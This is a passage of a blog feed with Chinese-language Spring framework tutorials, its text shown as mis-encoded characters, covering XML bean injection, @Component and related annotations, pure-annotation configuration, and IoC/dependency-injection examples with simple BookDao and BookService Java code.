tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>province<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>henan<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>city<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>kaifeng<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>props</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¯´æ˜ï¼špropertyæ ‡ç­¾è¡¨ç¤ºsetteræ–¹å¼æ³¨å…¥ï¼Œæ„é€ æ–¹å¼æ³¨å…¥constructor-argæ ‡ç­¾å†…éƒ¨ä¹Ÿå¯ä»¥å†™&lt;array&gt;ã€&lt;list&gt;ã€&lt;set&gt;ã€&lt;map&gt;ã€&lt;props&gt;æ ‡ç­¾</p></blockquote><h2 id="æ³¨è§£å¼€å‘"><a href="#æ³¨è§£å¼€å‘" class="headerlink" title="æ³¨è§£å¼€å‘"></a>æ³¨è§£å¼€å‘</h2><blockquote><p>æ³¨è§£ç›¸å½“äºä¸€ä¸ªæ¥å£ï¼Œç¨‹åºå¯ä»¥é€šè¿‡åå°„æ¥è·å–æŒ‡å®šç¨‹åºå…ƒç´ çš„æ³¨è§£å¯¹è±¡ã€‚</p><p>æ³¨è§£å¹¶ä¸å½±å“ç¨‹åºæ­£å¸¸è¿è¡Œã€‚</p><p>åœ¨Springä¸­ï¼Œxmlé…ç½®Beanå¯¹è±¡æœ‰äº›ç¹çï¼Œå¯ä»¥ä½¿ç”¨æ³¨è§£ç®€åŒ–Beanå¯¹è±¡çš„å®šä¹‰ï¼šåœ¨ç±»æˆ–è€…æ–¹æ³•ä¸ŠåŠ å…¥ç‰¹å®šçš„æ³¨è§£ï¼ˆ@XXX)ï¼Œå®Œæˆç‰¹å®šåŠŸèƒ½çš„å¼€å‘ã€‚</p><p>é€šè¿‡æ³¨è§£çš„æ–¹å¼ï¼Œåœ¨åŠŸèƒ½çš„è°ƒç”¨è€…å’Œæä¾›è€…ä¹‹é—´è¾¾æˆçº¦å®šï¼Œè¿›è€Œè¿›è¡ŒåŠŸèƒ½çš„è°ƒç”¨ã€‚å› ä¸ºæ³¨è§£æ›´ä¸ºæ–¹ä¾¿çµæ´»ï¼Œæ‰€ä»¥åœ¨ç°å®çš„å¼€å‘ä¸­ï¼Œæ›´æ¨èä½¿ç”¨æ³¨è§£çš„å½¢å¼å®Œæˆ</p></blockquote><p><strong>ä»£ç æ¼”ç¤ºï¼š</strong></p><ul><li>åœ¨ç±»ä¸Šä½¿ç”¨@Componentæ³¨è§£å®šä¹‰Beanã€‚</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">)</span>            <span class="token comment">// è¿™é‡Œç±»ä¼¼é…ç½®äº†ä¸€ä¸ªbeanï¼Œnameå«â€œbookDaoâ€</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//åŒç†åœ¨BookServiceImplä¸€æ ·å®šä¹‰æ³¨è§£</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">ServiceDao</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBookDao</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span> bookDao<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>bookDao <span class="token operator">=</span> bookDao<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>æ³¨è§£å®šä¹‰åï¼Œå¾—è®©SpringçŸ¥é“æœ‰è¿™ä¸ªæ³¨è§£ï¼Œå°±å¾—åœ¨xmlçš„é…ç½®æ–‡ä»¶æ·»åŠ ï¼Œè®©å…¶æ‰«æè¿™ä¸ªç›®å½•</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.yang<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>åœ¨æµ‹è¯•ç±»ä¸­è·å–bean</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">ApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"ApplicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BookDao</span> bookDao <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BookDao</span><span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//æŒ‰idå¯»æ‰¾bean</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bookDao<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ServiceDao</span> bookService <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">ServiceDao</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//æŒ‰ç±»å‹å¯»æ‰¾beanï¼Œæ‰€ä»¥BookServiceImplç±»é‡Œæ²¡æœ‰id</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bookService<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ç»“æœ</li></ul><p><img src="/2022/03/30/spring-kuang-jia-er/image-20220330180031817.png"></p><p>èƒ½å¤Ÿçœ‹åˆ°ä¸¤ä¸ªbeançš„åœ°å€ï¼ŒæˆåŠŸã€‚</p><blockquote><p>åœ¨æµ‹è¯•ç±»ä¸­ä¸è¦è°ƒç”¨bookServiceçš„saveæ–¹æ³•ï¼Œå› ä¸ºè¿˜æ²¡æœ‰ç»™ServiceImplä¸­çš„bookDaoèµ‹å€¼ï¼ˆåœ¨setteræ–¹æ³•å½“ä¸­ï¼‰ï¼Œè°ƒç”¨bookServiceçš„saveæ–¹æ³•ä¼šå‡ºç°ç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚</p><img src="image-20220330182551579.png"></blockquote><h4 id="Componentä¸‰ä¸ªè¡ç”Ÿæ³¨è§£"><a href="#Componentä¸‰ä¸ªè¡ç”Ÿæ³¨è§£" class="headerlink" title="@Componentä¸‰ä¸ªè¡ç”Ÿæ³¨è§£"></a>@Componentä¸‰ä¸ªè¡ç”Ÿæ³¨è§£</h4><p>éƒ½æ˜¯<code>Component</code>æ³¨è§£ä½¿å¾—å¼€å‘éš¾ä»¥çœ‹æ‡‚ï¼Œæ‰€ä»¥è¡ç”Ÿäº†ä¸‰ä¸ªæ³¨è§£ã€‚ä»–ä»¬å’Œ<code>Component</code>ä¸€æ ·ï¼Œåªæ˜¯æ¢ä¸ªåå­—</p><blockquote><ul><li><code>@Controller</code>ï¼šç”¨äºè¡¨ç°å±‚beanå®šä¹‰</li><li><code>@Service</code>ï¼šç”¨äºä¸šåŠ¡å±‚beanå®šä¹‰</li><li><code>@Repository</code>ï¼šç”¨äºæ•°æ®å±‚beanå®šä¹‰</li></ul></blockquote><h4 id="çº¯æ³¨è§£å¼€å‘æ¨¡å¼"><a href="#çº¯æ³¨è§£å¼€å‘æ¨¡å¼" class="headerlink" title="çº¯æ³¨è§£å¼€å‘æ¨¡å¼"></a>çº¯æ³¨è§£å¼€å‘æ¨¡å¼</h4><p>æ²¡æœ‰xmlé…ç½®æ–‡ä»¶å…¨æ˜¯æ³¨è§£ã€‚</p><ul><li>Spring3.0å¼€å¯äº†çº¯æ³¨è§£å¼€å‘æ¨¡å¼ï¼Œä½¿ç”¨Javaç±»æ›¿ä»£é…ç½®æ–‡ä»¶</li><li>Javaç±»ä»£æ›¿Springæ ¸å¿ƒé…ç½®æ–‡ä»¶</li><li>@Configurationæ³¨è§£ç”¨äºè®¾å®šå½“å‰ç±»ä¸ºé…ç½®ç±»</li><li>@ComponentScanæ³¨è§£ç”¨äºè®¾å®šæ‰«æè·¯å¾„ï¼Œæ­¤æ³¨è§£åªèƒ½æ·»åŠ ä¸€æ¬¡ï¼Œå¤šä¸ªæ•°æ®è¯·ç”¨æ•°ç»„æ ¼å¼</li></ul><p><strong>ä»£ç æ¼”ç¤ºï¼š</strong></p><ul><li>å®šä¹‰é…ç½®ç±»ä»£æ›¿é…ç½®æ–‡ä»¶</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//å£°æ˜å½“å‰ç±»ä¸ºSpringé…ç½®ç±»</span><span class="token annotation punctuation">@Configuration</span><span class="token comment">//Springæ³¨è§£æ‰«æï¼Œç›¸å½“äº&lt;context:component-scan base-package="com.yang"/&gt;</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.yang"</span><span class="token punctuation">)</span><span class="token comment">//è®¾ç½®beanæ‰«æè·¯å¾„ï¼Œå¤šä¸ªè·¯å¾„ä¹¦å†™ä¸ºå­—ç¬¦ä¸²æ•°ç»„æ ¼å¼</span><span class="token comment">//@ComponentScan({"com.yang.service","com.yang.dao"})</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>åœ¨APPæµ‹è¯•ç±»ä¸­åŠ è½½é…ç½®ç±»ï¼Œè·å–Beanå¯¹è±¡å¹¶ä½¿ç”¨</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AppForAnnotation</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//AnnotationConfigApplicationContextåŠ è½½Springé…ç½®ç±»åˆå§‹åŒ–Springå®¹å™¨</span>        <span class="token class-name">ApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BookDao</span> bookDao <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BookDao</span><span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bookDao<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//æŒ‰ç±»å‹è·å–bean</span>        <span class="token class-name">BookService</span> bookService <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">BookService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bookService<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JavaEE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Springæ¡†æ¶ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/03/29/spring-kuang-jia-yi/"/>
      <url>/2022/03/29/spring-kuang-jia-yi/</url>
      
        <content type="html"><![CDATA[<h4 id="Spring-ç®€ä»‹"><a href="#Spring-ç®€ä»‹" class="headerlink" title="Spring ç®€ä»‹"></a>Spring ç®€ä»‹</h4><h4 id="ç‰¹ç‚¹ï¼š"><a href="#ç‰¹ç‚¹ï¼š" class="headerlink" title="ç‰¹ç‚¹ï¼š"></a>ç‰¹ç‚¹ï¼š</h4><ul><li><strong>ç®€åŒ–å¼€å‘</strong>ï¼Œé™ä½ä¼ä¸šçº§å¼€å‘çš„å¤æ‚æ€§</li></ul><blockquote><p>IOC(åè½¬æ§åˆ¶)</p><p>AOP(é¢å‘åˆ‡é¢ç¼–ç¨‹)</p><ul><li>äº‹åŠ¡å¤„ç†</li></ul></blockquote><ul><li><strong>æ¡†æ¶æ•´åˆ</strong>ï¼Œé«˜æ•ˆæ•´åˆå…¶ä»–æŠ€æœ¯ï¼Œæé«˜ä¼ä¸šçº§åº”ç”¨å¼€å‘ä¸è¿è¡Œæ•ˆç‡</li></ul><blockquote><p>MyBatis</p><p>MyBatis-plus</p><p>Struts</p><p>Struts2</p><p>Hibernate</p><p>â€¦â€¦</p></blockquote><h4 id="åˆè¯†Springï¼š"><a href="#åˆè¯†Springï¼š" class="headerlink" title="åˆè¯†Springï¼š"></a>åˆè¯†Springï¼š</h4><p>å®˜ç½‘ï¼š<a href="https://spring.io/">https://spring.io</a></p><p>Springçš„ç”Ÿæ€åœˆ</p><p><img src="/2022/03/29/spring-kuang-jia-yi/image-20220329214242729.png"></p><p>ä¸»è¦å­¦ä¹ Spring frameworkï¼ˆSpringçš„åŸºç¡€ï¼‰ï¼ŒSpringbootï¼ˆæ›´ç®€å•ï¼Œæ›´æ–¹ä¾¿ï¼‰å’ŒSpring Cloud</p><h4 id="Spring-Frameworkç³»ç»Ÿæ¶æ„ï¼š"><a href="#Spring-Frameworkç³»ç»Ÿæ¶æ„ï¼š" class="headerlink" title="Spring Frameworkç³»ç»Ÿæ¶æ„ï¼š"></a>Spring Frameworkç³»ç»Ÿæ¶æ„ï¼š</h4><p><img src="/2022/03/29/spring-kuang-jia-yi/image-20210729172352627.png"></p><h4 id="SpringåŸºç¡€æ¦‚å¿µï¼š"><a href="#SpringåŸºç¡€æ¦‚å¿µï¼š" class="headerlink" title="SpringåŸºç¡€æ¦‚å¿µï¼š"></a>SpringåŸºç¡€æ¦‚å¿µï¼š</h4><ul><li>ç›®å‰ä»£ç çš„é—®é¢˜åœ¨äºé«˜è€¦åˆæ€§</li></ul><blockquote><p><img src="/2022/03/29/spring-kuang-jia-yi/image-20210729173516149.png"></p></blockquote><p>ä½†æ˜¯æƒ³è¦ä½¿ç”¨ï¼Œå¿…é¡»åˆ›å»ºå¯¹è±¡ã€‚</p><p>è§£å†³æ–¹æ¡ˆ</p><ul><li>ä½¿ç”¨å¯¹è±¡æ—¶ï¼Œåœ¨ç¨‹åºä¸­ä¸è¦ä¸»åŠ¨ä½¿ç”¨newäº§ç”Ÿå¯¹è±¡ï¼Œè½¬æ¢ä¸ºç”±å¤–éƒ¨æä¾›å¯¹è±¡</li></ul><ul><li>å¼•å…¥IOCï¼ˆæ§åˆ¶åè½¬ï¼‰ï¼š</li></ul><blockquote><p>ä½¿ç”¨å¯¹è±¡æ—¶ï¼Œç”±ä¸»åŠ¨newäº§ç”Ÿå¯¹è±¡è½¬æ¢ä¸ºç”±å¤–éƒ¨æä¾›å¯¹è±¡ï¼Œæ­¤è¿‡ç¨‹ä¸­å¯¹è±¡åˆ›å»ºæ§åˆ¶æƒç”±ç¨‹åºè½¬ç§»åˆ°å¤–éƒ¨ï¼Œæ­¤æ€æƒ³ç§°ä¸ºæ§åˆ¶åè½¬ã€‚é€šä¿—çš„è®²å°±æ˜¯â€œå°†newå¯¹è±¡çš„æƒåˆ©äº¤ç»™Springï¼Œæˆ‘ä»¬ä»Springä¸­è·å–å¯¹è±¡ä½¿ç”¨å³å¯â€</p></blockquote><ul><li>SpringæŠ€æœ¯å¯¹IoCæ€æƒ³è¿›è¡Œäº†å®ç°<ul><li>Springæä¾›äº†ä¸€ä¸ªå®¹å™¨ï¼Œç§°ä¸ºIOCå®¹å™¨ï¼Œç”¨æ¥å……å½“IoCæ€æƒ³ä¸­çš„â€œå¤–éƒ¨â€</li><li>IOCå®¹å™¨è´Ÿè´£å¯¹è±¡çš„åˆ›å»ºã€åˆå§‹åŒ–ç­‰ä¸€ç³»åˆ—å·¥ä½œï¼Œè¢«åˆ›å»ºæˆ–è¢«ç®¡ç†çš„å¯¹è±¡åœ¨IoCå®¹å™¨ä¸­ç»Ÿç§°ä¸º<strong>Bean</strong></li><li><img src="/2022/03/29/spring-kuang-jia-yi/image-20220329220927129.png"></li></ul></li><li>DIï¼ˆDependency Injectionï¼‰ä¾èµ–æ³¨å…¥ï¼ˆæ”¾å…¥äº†Serviceå’ŒDaoä¸¤ä¸ªå¯¹è±¡ï¼Œä¸¤ä¸ªå¯¹è±¡æ˜¯æœ‰ä¾èµ–å…³ç³»ï¼ˆimplementsï¼‰ï¼‰<ul><li>åœ¨å®¹å™¨ä¸­å»ºç«‹beanä¸beanä¹‹é—´çš„ä¾èµ–å…³ç³»çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œç§°ä¸ºä¾èµ–æ³¨å…¥ã€‚</li></ul></li></ul><blockquote><ul><li>é€šä¿—ç†è§£ï¼š</li></ul><p>Class Aä¸­ç”¨åˆ°äº†Class Bçš„å¯¹è±¡bï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéœ€è¦åœ¨Açš„ä»£ç ä¸­æ˜¾å¼çš„newä¸€ä¸ªBçš„å¯¹è±¡ã€‚é‡‡ç”¨ä¾èµ–æ³¨å…¥æŠ€æœ¯ä¹‹åï¼ŒAçš„ä»£ç åªéœ€è¦å®šä¹‰ä¸€ä¸ªç§æœ‰çš„Bå¯¹è±¡ï¼Œä¸éœ€è¦ç›´æ¥newæ¥è·å¾—è¿™ä¸ªå¯¹è±¡ï¼Œè€Œæ˜¯é€šè¿‡ç›¸å…³çš„å®¹å™¨æ§åˆ¶ç¨‹åºæ¥å°†Bå¯¹è±¡åœ¨å¤–éƒ¨newå‡ºæ¥å¹¶æ³¨å…¥åˆ°Aç±»é‡Œçš„å¼•ç”¨ä¸­ã€‚</p></blockquote><ul><li>æœ€ç»ˆæ•ˆæœ<ul><li>ä½¿ç”¨å¯¹è±¡æ—¶ä¸ä»…å¯ä»¥ç›´æ¥ä»IoCå®¹å™¨ä¸­è·å–ï¼Œå¹¶ä¸”è·å–åˆ°çš„beanå·²ç»ç»‘å®šäº†æ‰€æœ‰çš„ä¾èµ–å…³ç³»</li></ul></li></ul><h4 id="IOCå…¥é—¨å®ä¾‹ï¼š"><a href="#IOCå…¥é—¨å®ä¾‹ï¼š" class="headerlink" title="IOCå…¥é—¨å®ä¾‹ï¼š"></a>IOCå…¥é—¨å®ä¾‹ï¼š</h4><p><strong>åŸæœ¬å®ç°ï¼š</strong></p><p>é¡¹ç›®ç›®å½•ï¼š</p><img src="image-20220329231730590.png" style="zoom:50%;"><p>bookimplå’Œbookdao</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>dao<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">Bookdao</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Bookimpl</span> <span class="token keyword">implements</span> <span class="token class-name">Bookdao</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>dao</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Bookdao</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>serviceimplå’Œservicedao</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">Bookdao</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>dao<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">Bookimpl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>service<span class="token punctuation">.</span>servicedao</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> serviceimpl <span class="token keyword">implements</span> servicedao <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">Bookdao</span> bookdao <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bookimpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookdao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>service</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> servicedao <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>appæ‰§è¡Œç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yang</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>serviceimpl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>service<span class="token punctuation">.</span>servicedao</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> app <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        servicedao bookService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">serviceimpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜¾è€Œæ˜“è§æ‰§è¡Œç»“æœ</p><img src="image-20220329232136460.png" style="zoom:50%;"><p><strong>ä½¿ç”¨IOCå®ç°ï¼š</strong></p><p>å®ç°æ­¥éª¤ï¼š</p><ul><li>ã€ç¬¬ä¸€æ­¥ã€‘å¯¼å…¥Springåæ ‡</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--å¯¼å…¥springçš„åæ ‡spring-contextï¼Œå¯¹åº”ç‰ˆæœ¬æ˜¯5.2.10.RELEASE--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.2.10.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span 